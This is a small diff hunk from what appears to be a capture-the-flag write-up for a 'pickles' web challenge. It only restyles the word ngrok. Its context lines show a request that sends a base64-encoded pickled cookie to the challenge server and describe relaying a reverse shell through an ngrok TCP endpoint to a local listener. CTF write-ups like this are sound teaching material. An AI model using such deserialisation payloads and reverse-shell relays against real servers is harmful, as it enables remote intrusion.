@@ -81,7 +81,7 @@ pickled_base64_string = pickled_base64_bytes.decode('ascii')   #Base64 encoding 
 response=requests.get("https://pickles-web.challenges.ctf.ritsec.club/order",cookies={"order":pickled_base64_string})
 print(response.text)
 ```
-In order to execute a reverse shell a service like <code>ngrok</code> can be used. In this example I will listen on port <code>9001</code> of my own machine, but, for the server, I will listen on port <code>19945</code> at <code>4.tcp.eu.ngrok.io</code> (ngrok will redirect traffic on its port to mine). So:
+In order to execute a reverse shell a service like <code>ngrok</code> can be used. In this example I will listen on port <code>9001</code> of my own machine, but, for the server, I will listen on port <code>19945</code> at <code>4.tcp.eu.ngrok.io</code> (*ngrok* will redirect traffic on its port to mine). So:
 
 ![Listening_Reverse_Shell](https://user-images.githubusercontent.com/66698256/229460262-ab932d54-cd3b-4129-8e6a-0414c33c22e6.png)
 
